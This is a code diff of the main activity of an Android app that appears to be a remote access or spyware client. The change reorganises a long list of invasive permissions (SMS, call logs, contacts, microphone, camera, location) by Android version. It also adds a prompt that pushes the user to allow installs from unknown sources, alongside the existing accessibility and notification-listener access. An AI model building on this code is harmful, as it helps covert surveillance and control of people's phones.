@@ -13,6 +13,7 @@ import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.location.LocationManager;
 import android.media.projection.MediaProjectionManager;
+import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
@@ -20,6 +21,8 @@ import android.os.Messenger;
 import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
+import android.os.Build;
+import android.widget.Toast;
 
 import com.ot.grhq.client.functionality.FileManager;
 import com.ot.grhq.client.functionality.LocationV2;
@@ -53,24 +56,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private static String[] PERMISSIONS = {
-            Manifest.permission.CAMERA,
-            Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.WRITE_CONTACTS,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.MANAGE_EXTERNAL_STORAGE,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.REQUEST_INSTALL_PACKAGES,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE
-    };
-
     private SharedPreferences preferences;
 
     @Override
@@ -98,10 +83,11 @@ public class MainActivity extends AppCompatActivity {
             startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
         }
 
-
         startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
         startService(new Intent(this, NotificationListener.class));
         startService(new Intent(this, ForegroundService.class));
+
+        requestInstallPackagesPermission();
     }
 
     /**
@@ -120,7 +106,43 @@ public class MainActivity extends AppCompatActivity {
     private void checkPermissions() {
         List<String> permissionsToRequest = new ArrayList<>();
 
-        for (String permission : PERMISSIONS) {
+        String[] permissions;
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions = new String[]{
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.CALL_PHONE,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.SEND_SMS,
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.WRITE_CONTACTS,
+                    Manifest.permission.READ_MEDIA_AUDIO,
+                    Manifest.permission.READ_MEDIA_IMAGES,
+                    Manifest.permission.READ_MEDIA_VIDEO,
+                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.READ_PHONE_STATE,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.POST_NOTIFICATIONS, // New for Android 13
+            };
+        } else {
+            permissions = new String[]{
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.CALL_PHONE,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.SEND_SMS,
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.WRITE_CONTACTS,
+                    Manifest.permission.READ_EXTERNAL_STORAGE,
+                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                    Manifest.permission.MANAGE_EXTERNAL_STORAGE,
+                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.READ_PHONE_STATE,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+            };
+        }
+
+        for (String permission : permissions) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED)
                     permissionsToRequest.add(permission);
@@ -213,6 +235,21 @@ public class MainActivity extends AppCompatActivity {
                     requestPermissions(new String[] {permission}, PERMISSION_REQUEST_CODE);
                 }
             }
+        }
+    }
+
+    public void requestInstallPackagesPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            if (!getPackageManager().canRequestPackageInstalls()) {
+                // Redirect the user to the settings page
+                Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, 1234); // Use a unique request code
+            } else {
+                Toast.makeText(this, "Permission already granted", Toast.LENGTH_SHORT).show();
+            }
+        } else {
+            Toast.makeText(this, "Not required for your Android version", Toast.LENGTH_SHORT).show();
         }
     }
 
